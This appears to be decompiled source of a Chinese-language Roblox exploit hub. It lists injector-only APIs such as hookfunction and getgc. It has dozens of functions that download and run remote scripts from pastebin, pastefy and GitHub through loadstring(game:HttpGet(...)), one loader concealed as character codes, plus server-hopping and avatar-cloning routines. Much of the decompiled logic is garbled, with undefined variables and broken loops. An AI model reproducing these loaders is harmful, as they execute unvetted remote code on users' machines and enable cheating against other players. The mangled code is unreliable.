script = script,
shared = shared,
plugin = plugin,
Instance = Instance,
Vector2 = Vector2,
Vector3 = Vector3,
Vector2int16 = Vector2int16,
Vector3int16 = Vector3int16,
CFrame = CFrame,
Color3 = Color3,
UDim = UDim,
UDim2 = UDim2,
Rect = Rect,
Region3 = Region3,
Ray = Ray,
NumberRange = NumberRange,
NumberSequence = NumberSequence,
NumberSequenceKeypoint = NumberSequenceKeypoint,
ColorSequence = ColorSequence,
ColorSequenceKeypoint = ColorSequenceKeypoint,
BrickColor = BrickColor,
TweenInfo = TweenInfo,
PhysicalProperties = PhysicalProperties,
Faces = Faces,
Axes = Axes,
Random = Random,
DateTime = DateTime,
Font = Font,
OverlapParams = OverlapParams,
RaycastParams = RaycastParams,
Enum = Enum,
wait = wait,
tick = tick,
time = time,
elapsedTime = elapsedTime,
typeof = typeof,
warn = warn,
spawn = spawn,
delay = delay,
task = task,
getgenv = getgenv,
getrenv = getrenv,
getsenv = getsenv,
getreg = getreg,
getgc = getgc,
getloadedmodules = getloadedmodules,
getinstances = getinstances,
getnilinstances = getnilinstances,
getscripts = getscripts,
getconnections = getconnections,
getrunningscripts = getrunningscripts,
getcallingscript = getcallingscript,
gethui = gethui,
getthreadidentity = getthreadidentity,
setthreadidentity = setthreadidentity,
checkcaller = checkcaller,
islclosure = islclosure,
iscclosure = iscclosure,
isourclosure = isourclosure,
is_synapse_function = is_synapse_function,
clonefunction = clonefunction,
cloneref = cloneref,
compareinstances = compareinstances,
newcclosure = newcclosure,
hookfunction = hookfunction,
replaceclosure = replaceclosure,
hookmetamethod = hookmetamethod,
getrawmetatable = getrawmetatable,
setrawmetatable = setrawmetatable,
setreadonly = setreadonly,
isreadonly = isreadonly,
make_writeable = make_writeable,
make_readonly = make_readonly,
identifyexecutor = identifyexecutor,
getexecutorname = getexecutorname,
setclipboard = setclipboard,
toclipboard = toclipboard,
setfpscap = setfpscap,
firetouchinterest = firetouchinterest,
fireclickdetector = fireclickdetector,
fireproximityprompt = fireproximityprompt,
keypress = keypress,
keyrelease = keyrelease,
mouse1click = mouse1click,
mouse1press = mouse1press,
mouse1release = mouse1release,
mousemoverel = mousemoverel,
queue_on_teleport = queue_on_teleport,
saveinstance = saveinstance,
decompile = decompile,
getscriptclosure = getscriptclosure,
getfunctionhash = getfunctionhash,
getcustomasset = getcustomasset,
rconsoleprint = rconsoleprint,
rconsolename = rconsolename,
rconsoleclear = rconsoleclear,
setfflag = setfflag,
protectgui = protectgui,
unprotectgui = unprotectgui,
sethiddenproperty = sethiddenproperty,
gethiddenproperty = gethiddenproperty,
isnetworkowner = isnetworkowner,
isfile = isfile,
isfolder = isfolder,
makefolder = makefolder,
delfile = delfile,
delfolder = delfolder,
listfiles = listfiles,
readfile = readfile,
writefile = writefile,
appendfile = appendfile,
loadfile = loadfile,
dofile = dofile,
request = request,
http_request = request,
crypt = crypt,
base64_encode = base64_encode,
base64_decode = base64_decode,
base64encode = base64_encode,
base64decode = base64_decode,
syn = syn,
WebSocket = WebSocket,
Drawing = Drawing,
DrawingImmediate = Drawing,
}
Element120._G = Element120
local Element121 = Element120
Element120.Translation = Request15
if Request15 then
    task.spawn(Job95)
    return Request15
else
    return Request15, Element121
end

end

local function Job102(translationSpeed)
    x11.TranslationSpeed = translationSpeed
    return translationSpeed, x11
end

local function Job103()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-SCP-096-36948"))
end

local function Job104()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Emote-Player-51936"))
end

local function Job105()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Tufoos93-Gui-V1-153864"))
end

local function Job106()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Coolkid-gui-2.0-224364"))
end

local function Job107()
    loadstring(game:HttpGet("https://pastebin.com/raw/JipYNCht"))
end

local function Job108()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/Kennyå¨ç»ä¸­å¿.lua"))
end

local function Job109()
    loadstring(game:HttpGet("https://pastebin.com/raw/XR4sGcgJ"))
end

local function Job110()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Emote-Player-51936"))
end

local function Job111()
    loadstring(game:HttpGet("https://pastefy.app/XuozWTqG/raw"))
end

local function Job112()
    loadstring(game:HttpGet("https://pastefy.app/3nfhEHQi/raw"))
end

local function Job113()
    loadstring(game:HttpGet("https://pastebin.com/raw/Mb49LJyU"))
end

local function Job114()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh/heads/main/source/reanimdev.lua"))
end

local function Job115()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-script-20557"))
end

local function Job116()
    loadstring(game:HttpGet("https://pastebin.com/raw/r862rtmj"))
end

local function Job117()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6"))
end

local function Job118()
    x11.XiaoPi = "ç®èæ¬QQç¾¤1002100032"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))
end

local function Job119()
    loadstring(game:HttpGet("https://github.com/devslopo/DVES/raw/main/XK%20Hub"))
end

local function Job120()
    loadstring(game:HttpGet("https://githubusercontent.com/pl11451481mvcxz/chuangjiaobenzhongxin/raw/refs/heads/main/Script.lua"))
end

local function Job121()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/nb/refs/heads/main/%E7%AA%97%E8%84%9A%E6%9C%AC%E5%8A%A0%E8%BD%BD%E5%99%A8.lua"))
end

local function Job122()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua"))
end

local function Job123()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/61646764343/ye-script/refs/heads/main/ye%20script.lua", true))
end

local function Job124()
    local function getValue()
        return table.unpack({
        [1] = 108,
        [2] = 111,
        [3] = 97,
        [4] = 100,
        [5] = 115,
        [6] = 116,
        [7] = 114,
        [8] = 105,
        [9] = 110,
        [10] = 103,
        [11] = 40,
        [12] = 103,
        [13] = 97,
        [14] = 109,
        [15] = 101,
        [16] = 58,
        [17] = 72,
        [18] = 116,
        [19] = 116,
        [20] = 112,
        [21] = 71,
        [22] = 101,
        [23] = 116,
        [24] = 40,
        [25] = 34,
        [26] = 104,
        [27] = 116,
        [28] = 116,
        [29] = 112,
        [30] = 115,
        [31] = 58,
        [32] = 47,
        [33] = 47,
        [34] = 114,
        [35] = 97,
        [36] = 119,
        [37] = 46,
        [38] = 103,
        [39] = 105,
        [40] = 116,
        [41] = 104,
        [42] = 117,
        [43] = 98,
        [44] = 117,
        [45] = 115,
        [46] = 101,
        [47] = 114,
        [48] = 99,
        [49] = 111,
        [50] = 110,
        [51] = 116,
        [52] = 101,
        [53] = 110,
        [54] = 116,
        [55] = 46,
        [56] = 99,
        [57] = 111,
        [58] = 109,
        [59] = 47,
        [60] = 67,
        [61] = 104,
        [62] = 105,
        [63] = 110,
        [64] = 97,
        [65] = 81,
        [66] = 89,
        [67] = 47,
        [68] = 45,
        [69] = 47,
        [70] = 109,
        [71] = 97,
        [72] = 105,
        [73] = 110,
        [74] = 47,
        [75] = 37,
        [76] = 69,
        [77] = 54,
        [78] = 37,
        [79] = 56,
        [80] = 51,
        [81] = 37,
        [82] = 56,
        [83] = 53,
        [84] = 37,
        [85] = 69,
        [86] = 52,
        [87] = 37,
        [88] = 66,
        [89] = 65,
        [90] = 37,
        [91] = 57,
        [92] = 49,
        [93] = 34,
        [94] = 41,
        [95] = 41,
        [96] = 40,
        [97] = 41,
        })
    end
    loadstring(utf8.char(getValue()))
end

local function Job125()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Zyb150933/ROB/refs/heads/main/ROB.V2"))
end

local function Job126()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tfcygvunbind/Apple/main/é»ç½èæ¬å è½½å¨"))
end

local function Job127()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/whenheer/dasimav6/refs/heads/main/dasimaV6.txt"))
end

local function Job128()
    x11.LS = "è½å¶ä¸­å¿"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/krlpl/Deciduous-center-LS/main/%E8%90%BD%E5%8F%B6%E4%B8%AD%E5%BF%83%E6%B7%B7%E6%B7%86.txt"))
end

local function Job129()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yb666TX-Free-YDYS/main/ShuHUB.lua"))
end

local function Job130()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingdiandian/Script3/rw/penu/LoadiQ192095711/lua"))
end

local function Job131()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CheekSB/X-pro/refs/heads/main/SBX(Pro).lua"))
end

local function Job132()
    loadstring("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/BINjiaobzx6/BINjiao/main/XK.TXT\"))()\n")
end

local function Job133()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/vbxfhcd/BS/refs/heads/main/BS-loves_you.txt"))
end

local function Job134()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yungengxin/roblox/refs/heads/main/Rb-Hub"))
end

local function Job135()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/9178/refs/heads/main/QQ3999698324.NB"))
end

local function Job136(Request22)
    local Element122
    local function Job137()
        SetCore:SetBackgroundImage(Element122)
    end
    Element122 = ""
    if Request22 ~= ""
    Element122 = "rbxassetid://" .. Request22
    pcall(Job137)
    Element31:Notify({
    Title = "èæ¯å·²æ´æ¹",
    Content = "æ°èæ¯ï¼rbxassetid://" .. Request22,
    Icon = "check",
    Duration = 3,
    })
    return Request22, Element122
else
    return
end

end

local function Job138(Request23)
    Element31:SetTheme(Request23)
    return Request23
end

local function Job139(Request24)
    local Element123
    local function Job140()
        if SetCore.SetBackgroundImage then
            SetCore:SetBackgroundImage(Element123)
        else
            SetCore.Background = Element123
            return
        end
    end
    Element123 = {
    ["å¹æ ¹"] = "rbxassetid://104348365371258",
    ["ç«æ´è³æº"] = "rbxassetid://132372937787351",
    ["æªäººåä¼rk"] = "rbxassetid://73573809374499",
    ["è¿·ä½ ä¸ç"] = "rbxassetid://109228695009148",
    }
    local Element124 = Element123
    Element123 = Element123[Request24] or ""
    local Ok2 = pcall(Job140)
    if not Ok2 then
        warn("è®¾ç½®èæ¯å¤±è´¥ï¼å½å WindUI çæ¬å¯è½ä¸æ¯ææ­¤æ¹æ³")
        return Request24, Element124, Element123, Ok2
    else
        return
    end
end

local function Job141(Request25)
    SetCore:SetBackgroundTransparency(Request25)
    SetCore:SetBackgroundImageTransparency(Request25)
    return Request25
end

local function Job142()
    SetCore:SetBackgroundTransparency(1)
    SetCore:SetBackgroundImageTransparency(1)
end

local function Job143()
    SetCore:SetBackgroundTransparency(0.5)
    SetCore:SetBackgroundImageTransparency(0.5)
end

local function Job144()
    SetCore:SetBackgroundTransparency(0)
    SetCore:SetBackgroundImageTransparency(0)
end

local function Job145()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/Yellowtooth/refs/heads/main/GB.HUB"))
end

local function Job146()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wzhxll/Liu-Ye-is-aguest/refs/heads/main/Skin%20HUB%20%E5%85%8D%E8%B4%B9%E7%89%88.lua"))
end

local function Job147()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/Legio197/refs/heads/main/GBHUB.lua"))
end

local function Job148()
    x11.SCRIPT_KEY = ""
    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8d36cbb0e44bb4a4a844499c7f7140bc7734f8072eebf59a4d4784773bf17dfa/download"))
end

local function Job149()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sleenndn/Sleenndn-/refs/heads/main/cnm"))
end

local function Job150()
    loadstring(game:HttpGet("https://pastefy.app/xOXIJXr9/raw"))
end

local function Job151()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/gbfly/refs/heads/main/fly.lua"))
end

local function Job152()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/Q1107181697/refs/heads/main/Roor.lua"))
end

local function Job153()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/f34p9fh3a4/.xyz/refs/heads/main/loader.lua"))
end

local function Job154()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nlzzpro/rscripts/refs/heads/main/prisonlife"))
end

local function Job155()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DiosDi/VexonHub/refs/heads/main/VexonHub"))
end

local function Job156()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/phantasm.lua"))
end

local function Job157()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cytj777i/Deliver-through-the-wall-perspective/main/å¤©ä¸å¸æ­¦"))
end

local function Job158()
    loadstring(game:HttpGet("https://rawscripts.net/raw/The-Strongest-Battlegrounds-SION-ELTNAM-ATLASIA-61168"))
end

local function Job159()
    loadstring(game:HttpGet("https://gitlab.com/zkay404-group/ProjectYielding/-/raw/main/ZKPublicFarm"))
end

local function Job160()
    loadstring(game:HttpGet("https://pastefy.app/REPoaFWC/raw", true))
end

local function Job161()
    loadstring(game:HttpGet("https://pastebin.com/raw/arzRCgwS"))
end

local function Job162()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))
end

local function Job163()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/å¿è.lua"))
end

local function Job164()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))
end

local function callback2()
    setclipboard("1107181697")
    Element31:Notify({
    Title = "å¤å¶æå",
    Content = "QQ ç¾¤å·å·²å¤å¶",
    Duration = 2,
    })
end

local function callback3()
    setclipboard("ä¾æ§å¹æ ¹å¤´")
    Element31:Notify({Title = "å¤å¶æå", Content = "å·²å¤å¶", Duration = 2})
end

local function Job165()
    setclipboard("æ£æ¨")
    Element31:Notify({Title = "å¤å¶æå", Content = "æ£æ¨", Duration = 2})
end

local function callback4()
    setclipboard("https://wearedevs.net/obfuscator")
    Element31:Notify({Title = "å¤å¶æå", Content = "å·²å¤å¶", Duration = 2})
end

local function callback5()
    setclipboard("https://junkie-development.de/")
    Element31:Notify({Title = "å¤å¶æå", Content = "å·²å¤å¶", Duration = 2})
end

local function callback6()
    setclipboard("https://lura.ph/")
    Element31:Notify({Title = "å¤å¶æå", Content = "å·²å¤å¶", Duration = 2})
end

local function callback7()
    setclipboard("https://moonveil.cc")
    Element31:Notify({Title = "å¤å¶æå", Content = "å·²å¤å¶", Duration = 2})
end

local function Job166()
    setclipboard("https://goofyscator.lua.cz/")
    Element31:Notify({Title = "å¤å¶æå", Content = "å·²å¤å¶", Duration = 2})
end

local function callback8()
    setclipboard(".gg/25ms")
    Element31:Notify({Title = "å¤å¶æå", Content = "å·²å¤å¶", Duration = 2})
end

local function Job167()
    setclipboard(".gg/threaded")
    Element31:Notify({Title = "å¤å¶æå", Content = "å·²å¤å¶", Duration = 2})
end

local SpeedTab3
local function Job168(Request26)
    local format
    local function httpGet()
        return SpeedTab3:JSONDecode(game:HttpGet(format))
    end
    format = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&limit=100", game.PlaceId, Request26)
    local Ok3, Element125 = pcall(httpGet)
    if Ok3 and Element125 and Element125.data then
        return Element125.data
    else
        return nil
    end
end

local TeleportService, Teleportservice, Players
local function processItems7()
    local Element126 = Players("Asc")
    local Element127, Element128, Element129, Unpacked20, Unpacked21, Element130, Element131, Unpacked22, Pack15
    if not Element126 then
        Element31:Notify({
        Title = "éè¯¯",
        Content = "è·åæå¡å¨åè¡¨å¤±è´¥",
        Icon = "alert-triangle",
        Duration = 3,
        })
    else
        Element127 = ipairs(Element126)
        Element128 = Element126
        Pack15 = table.pack(Element127(Element128, 0))
        Unpacked20 = table.unpack(Pack15, 1, Pack15.Element116)
        if not (Unpacked20 == nil) then
            Element129 = Unpacked20
            local Element132 = {}
            while true do
                if Pack15[2].Unpacked22 >= Pack15[2].maxPlayers then
                    Pack15 = table.pack(Element127(Element128, Element129))
                    Unpacked20 = table.unpack(Pack15, 1, Pack15.Element116)
                    if Unpacked20 ~= nil then
                        Element129 = Unpacked20
                        continue
                    end
                    break
                end
                Element130 = Element132
                Element132.Title = "æå¡å¨è·³è½¬"
                Element131 = string.format
                Unpacked22 = table.unpack(Pack15, 2, Pack15.Element116).Unpacked22
                Unpacked21 = table.unpack(Pack15, 2, Pack15.Element116)
                Element130.Content = Element131("æ­£å¨å å¥äººå°æå¡å¨ (%d/%d)", Unpacked22, Unpacked21.maxPlayers)
                Element130.Icon = "users"
                Element130.Duration = 3
                Element31:Notify(Element130)
                task.wait(1)
                Element131 = Unpacked21.id
                TeleportService:TeleportToPlaceInstance(game.PlaceId, Element131, Teleportservice)
                return Element126, Element127, Element128, Element129, Unpacked20, Unpacked21
            end
        end
        Element31:Notify({
        Title = "éè¯¯",
        Content = "æ²¡ææ¾å°å¯å å¥çæå¡å¨",
        Icon = "alert-triangle",
        Duration = 3,
        })
    end
    return Element126
end

local function processItems8()
    local Element133 = Players("Desc")
    local Element134, Element135, Element136, Unpacked23, Unpacked24, Element137, Element138, Unpacked25, Pack16
    if not Element133 then
        Element31:Notify({
        Title = "éè¯¯",
        Content = "è·åæå¡å¨åè¡¨å¤±è´¥",
        Icon = "alert-triangle",
        Duration = 3,
        })
    else
        Element134 = ipairs(Element133)
        Element135 = Element133
        Pack16 = table.pack(Element134(Element135, 0))
        Unpacked23 = table.unpack(Pack16, 1, Pack16.Element116)
        if not (Unpacked23 == nil) then
            Element136 = Unpacked23
            local Element139 = {}
            while true do
                if Pack16[2].Unpacked22 >= Pack16[2].maxPlayers then
                    Pack16 = table.pack(Element134(Element135, Element136))
                    Unpacked23 = table.unpack(Pack16, 1, Pack16.Element116)
                    if Unpacked23 ~= nil then
                        Element136 = Unpacked23
                        continue
                    end
                    break
                end
                Element137 = Element139
                Element139.Title = "æå¡å¨è·³è½¬"
                Element138 = string.format
                Unpacked25 = table.unpack(Pack16, 2, Pack16.Element116).Unpacked22
                Unpacked24 = table.unpack(Pack16, 2, Pack16.Element116)
                Element137.Content = Element138("æ­£å¨å å¥äººå¤æå¡å¨ (%d/%d)", Unpacked25, Unpacked24.maxPlayers)
                Element137.Icon = "users"
                Element137.Duration = 3
                Element31:Notify(Element137)
                task.wait(1)
                Element138 = Unpacked24.id
                TeleportService:TeleportToPlaceInstance(game.PlaceId, Element138, Teleportservice)
                return Element133, Element134, Element135, Element136, Unpacked23, Unpacked24
            end
        end
        Element31:Notify({
        Title = "éè¯¯",
        Content = "æ²¡ææ¾å°å¯å å¥çæå¡å¨",
        Icon = "alert-triangle",
        Duration = 3,
        })
    end
    return Element133
end

local function performTask()
    Element31:Notify({
    Title = "æå¡å¨è·³è½¬",
    Content = "æ­£å¨éæ°å å¥å½åæå¡å¨...",
    Icon = "refresh-cw",
    Duration = 3,
    })
    task.wait(1)
    local JobId = game.JobId
    TeleportService:TeleportToPlaceInstance(game.PlaceId, JobId, Teleportservice)
end

local Dark
local function Job169()
    Dark()
end

local Light
local function Job170()
    Light()
end

local Mocha
local function Job171()
    Mocha()
end

local function Job172()
end

local function Instance11(Instance12)
    return Instance12:IsA("Accessory") or Instance12:IsA("Shirt") or Instance12:IsA("Pants") or Instance12:IsA("ShirtGraphic") or Instance12:IsA("BodyColors") or Instance12:IsA("CharacterMesh")
end

local function Job173(Request27)
    return ({
    HatAttachment = "Head",
    HairAttachment = "Head",
    FaceFrontAttachment = "Head",
    FaceCenterAttachment = "Head",
    FaceBackAttachment = "Head",
    NeckAttachment = "UpperTorso",
    ShoulderAttachment = "UpperTorso",
    BackAttachment = "UpperTorso",
    WaistCenterAttachment = "LowerTorso",
    WaistFrontAttachment = "LowerTorso",
    WaistBackAttachment = "LowerTorso",
    LeftCollarAttachment = "UpperTorso",
    RightCollarAttachment = "UpperTorso",
    FrontAttachment = "UpperTorso",
    })[Request27]
end

local function Instance13(Instance14, Instance15)
    return Instance14:FindFirstChild(Instance15) or Instance14:FindFirstChild("UpperTorso") or Instance14:FindFirstChild("Torso") or Instance14:FindFirstChild("Head")
end

local LocalPlayer16, Players
local function checkCondition2(Request28, parent)
    local Unpacked26, Element140, Element141, Clone, Unpacked27, Unpacked28, Element142, Element143, Unpacked29, Unpacked30, Pack17
    if not Request28:FindFirstChild("Handle") then
        return false
    else
        Unpacked26 = nil
        Request28:GetDescendants()
        Element140 = ipairs(Element141)
        Pack17 = table.pack(Element140(Element141, 0))
        Unpacked27 = table.unpack(Pack17, 1, Pack17.Element116)
        if not (Unpacked27 == nil) then
            Clone = Unpacked27
            while true do
                Unpacked28 = table.unpack(Pack17, 2, Pack17.Element116)
                Element143 = Unpacked28
                Element142 = Unpacked28:IsA("Attachment")
                if Element142 then
                    Unpacked26 = table.unpack(Pack17, 2, Pack17.Element116)
                else
                    Pack17 = table.pack(Element140(Element141, Clone))
                    Unpacked27 = table.unpack(Pack17, 1, Pack17.Element116)
                    if Unpacked27 == nil then
                        break
                    else
                        Clone = Unpacked27
                        continue
                    end
                end
                break
            end
        end
        Element141 = Players(parent, Unpacked26 and LocalPlayer16(Unpacked26.Name) or "Head")
        if not Element141 then
            return false
        else
            Clone = Request28:Clone()
            Clone.Parent = parent
            Unpacked27 = Clone:FindFirstChild("Handle")
            if not Unpacked27 then
                ipairs(Clone)
                return false
            else
                Unpacked27:GetChildren()
                Unpacked28 = ipairs(Element142)
                Pack17 = table.pack(Unpacked28(Element142, 0))
                Unpacked29 = table.unpack(Pack17, 1, Pack17.Element116)
                if not (Unpacked29 == nil) then
                    Element143 = Unpacked29
                    while true do
                        if table.unpack(Pack17, 2, Pack17.Element116)
                            :IsA("Weld") or table.unpack(Pack17, 2, Pack17.Element116)
                            :IsA("WeldConstraint") then
                            table.unpack(Pack17, 2, Pack17.Element116):Destroy()
                            Pack17 = table.pack(Unpacked28(Element142, Element143))
                            Unpacked29 = table.unpack(Pack17, 1, Pack17.Element116)
                            if Unpacked29 == nil then
                                Element143 = Unpacked29
                            else
                                Element143 = Unpacked29
                                continue
                            end
                        else
                            Pack17 = table.pack(Unpacked28(Element142, Element143))
                            Unpacked29 = table.unpack(Pack17, 1, Pack17.Element116)
                            if Unpacked29 == nil then
                                break
                            else
                                Element143 = Unpacked29
                                continue
                            end
                        end
                        break
                    end
                end
                Clone:GetDescendants()
                Element142 = ipairs(Element143)
                Pack17 = table.pack(Element142(Element143, 0))
                Unpacked30 = table.unpack(Pack17, 1, Pack17.Element116)
                if not (Unpacked30 == nil) then
                    Unpacked29 = Unpacked30
                    while true do
                        if table.unpack(Pack17, 2, Pack17.Element116):IsA("Attachment") then
                            table.unpack(Pack17, 2, Pack17.Element116)
                        else
                            Pack17 = table.pack(Element142(Element143, Unpacked29))
                            Unpacked30 = table.unpack(Pack17, 1, Pack17.Element116)
                            if Unpacked30 == nil then
                                break
                            else
                                Unpacked29 = Unpacked30
                                continue
                            end
                        end
                        break
                    end
                end
                Element142 = nil
                Element143 = ipairs
                Element143.C0 = Element141:GetChildren()
            end
        end
    end
    Element143.C1 = Element142.CFrame
    Element143.Parent = Unpacked27
    return true
end

local function findChild2(Request29, Request30)
    local Element144, Element145, Element146, Unpacked31, Unpacked32, Unpacked33, Pack18
    if not (not Request29 or not Request30) then
        Element144 = ipairs(x12)
        Element145 = x12
        Pack18 = table.pack(Element144(Element145, 0))
        Unpacked31 = table.unpack(Pack18, 1, Pack18.Element116)
        if not (Unpacked31 == nil) then
            Element146 = Unpacked31
            while true do
                Unpacked32 = Request30:FindFirstChild(table.unpack(Pack18, 2, Pack18.Element116))
                Unpacked33 = Request29:FindFirstChild(table.unpack(Pack18, 2, Pack18.Element116))
                if Unpacked32 and Unpacked33 then
                    Unpacked33.Value = Unpacked32.Value
                end
                Pack18 = table.pack(Element144(Element145, Element146))
                Unpacked31 = table.unpack(Pack18, 1, Pack18.Element116)
                if Unpacked31 ~= nil then
                    Element146 = Unpacked31
                    continue
                end
                break
            end
        end
        return Request29, Request30, Element144, Element145, Unpacked31, table.unpack(Pack18, 1, Pack18.Element116)
    end
end

local Rose, Element147, Element148, Element149
local function runProtected4(Request31)
    local Character12, Unpacked34
    local function Instance16()
        Unpacked34:Clone().Parent = Character12
    end
    Character12 = Rose.Character
    local Character13, Humanoid13, Humanoid14, Element150, Unpacked35, Children, Unpacked36, Unpacked37, Unpacked38, Destroy, Clone2, Pack19
    if not Character12 then
        Element31:Notify({
        Title = "éè¯¯",
        Content = "ä½ è¿æ²¡æè§è²",
        Duration = 3,
        })
        return Request31, Character12
    else
        Character13 = Request31.Character
        if not Character13 then
            Element31:Notify({
            Title = "éè¯¯",
            Content = "ç®æ ç©å®¶è¿æ²¡æè§è²",
            Duration = 3,
            })
            return Request31, Character12, Character13
        else
            Humanoid13 = Character12:FindFirstChildOfClass("Humanoid")
            if not Humanoid13 then
                Element31:Notify({
                Title = "éè¯¯",
                Content = "æ¾ä¸å° Humanoid",
                Duration = 3,
                })
                return Request31, Character12, Character13, Humanoid13
            else
                Humanoid14 = Character13:FindFirstChildOfClass("Humanoid")
                Element149(Humanoid13, Humanoid14)
                Element150 = {}
                Character12:GetChildren()
                Unpacked35 = ipairs(Children)
                Pack19 = table.pack(Unpacked35(Children, 0))
                Unpacked37 = table.unpack(Pack19, 1, Pack19.Element116)
                repeat
                    local shouldExit2 = false
                    if Unpacked37 == nil then
                        Character12:GetChildren()
                        Unpacked35 = ipairs(Children)
                        Pack19 = table.pack(Unpacked35(Children, 0))
                        table.unpack(Pack19, 1, Pack19.Element116)
                        Unpacked35 = 0
                        Children = 0
                        Unpacked36 = ipairs
                        Unpacked38 = Character13
                        Unpacked37 = Character13.GetChildren
                    else
                        Unpacked36 = Unpacked37
                        local __cont2 = false
                        while true do
                            Unpacked34 = table.unpack(Pack19, 2, Pack19.Element116)
                            Destroy = Element147(Unpacked34)
                            if Destroy then
                                Destroy = table.insert
                                Unpacked34 = Element150
                                Unpacked38 = table.unpack(Pack19, 2, Pack19.Element116)
                                Clone2 = Unpacked38:Clone()
                                Destroy(table.unpack(Pack19, 4, Pack19.Element116))
                                Pack19 = table.pack(Unpacked35(Children, Unpacked36))
                                Unpacked37 = table.unpack(Pack19, 1, Pack19.Element116)
                                if Unpacked37 == nil then
                                    Character12:GetChildren()
                                    Unpacked35 = ipairs(Children)
                                    Pack19 = table.pack(Unpacked35(Children, 0))
                                    table.unpack(Pack19, 1, Pack19.Element116)
                                    Unpacked35 = 0
                                    Children = 0
                                    Unpacked36 = ipairs
                                    Unpacked38 = Character13
                                    Unpacked37 = Character13.GetChildren
                                else
                                    Unpacked36 = Unpacked37
                                    continue
                                end
                            else
                                Pack19 = table.pack(ipairs(Children, Unpacked36))
                                Unpacked37 = ipairs(Children)
                                if Unpacked37 == nil then
                                    Children = Character12:GetChildren()
                                    Unpacked37 = table.unpack(Pack19, 1, Pack19.Element116)
                                    Unpacked38 = table.unpack(Pack19, 2, Pack19.Element116)
                                    Pack19 = table.pack(ipairs(Children, Character12, Unpacked37, Unpacked38, Destroy, Unpacked34, Clone2))
                                    Unpacked35 = table.unpack(Pack19, 1, Pack19.Element116)
                                    Children = table.unpack(Pack19, 2, Pack19.Element116)
                                    Unpacked36 = table.unpack(Pack19, 3, Pack19.Element116)
                                    Pack19 = table.pack(Unpacked35(Children, Unpacked36))
                                    table.unpack(Pack19, 1, Pack19.Element116)
                                    Unpacked35 = 0
                                    Children = 0
                                    Unpacked36 = ipairs
                                    Unpacked38 = Character13
                                    Unpacked37 = Character13.GetChildren
                                else
                                    Unpacked36 = Unpacked37
                                    while true do
                                        Unpacked34 = Children
                                        Destroy = Element147(Unpacked34)
                                        if Destroy then
                                            Destroy = table.insert
                                            Unpacked34 = Element150
                                            Unpacked38 = table.unpack(Pack19, 2, Pack19.Element116)
                                            Clone2 = Unpacked38:Clone()
                                            Destroy(Unpacked34, Clone2)
                                            Pack19 = table.pack(Unpacked35(Children, Unpacked36))
                                            Unpacked37 = table.unpack(Pack19, 1, Pack19.Element116)
                                            if Unpacked37 == nil then
                                                Character12:GetChildren()
                                                Unpacked35 = ipairs(Children)
                                                Pack19 = table.pack(Unpacked35(Children, 0))
                                                table.unpack(Pack19, 1, Pack19.Element116)
                                                Unpacked35 = 0
                                                Children = 0
                                                Unpacked36 = ipairs
                                                Unpacked38 = Character13
                                                Unpacked37 = Character13.GetChildren
                                            else
                                                Unpacked36 = Unpacked37
                                                __cont2 = true
                                                break
                                            end
                                        else
                                            Unpacked37 = ipairs(Children)
                                            if Unpacked37 == nil then
                                                break
                                            else
                                                Unpacked36 = Unpacked37
                                                continue
                                            end
                                        end
                                        shouldExit2 = true
                                        break
                                    end
                                    if shouldExit2 then
                                        break
                                    end
                                    if __cont2 then
                                        __cont2 = false
                                        continue
                                    end
                                    break
                                end
                            end
                            shouldExit2 = true
                            break
                        end
                        if shouldExit2 then
                            break
                        end
                        Children = Character12:GetChildren()
                        Unpacked37 = table.unpack(Pack19, 1, Pack19.Element116)
                        Unpacked38 = table.unpack(Pack19, 2, Pack19.Element116)
                        Pack19 = table.pack(ipairs(Children, Character12, Unpacked37, Unpacked38, Destroy, Unpacked34, Clone2))
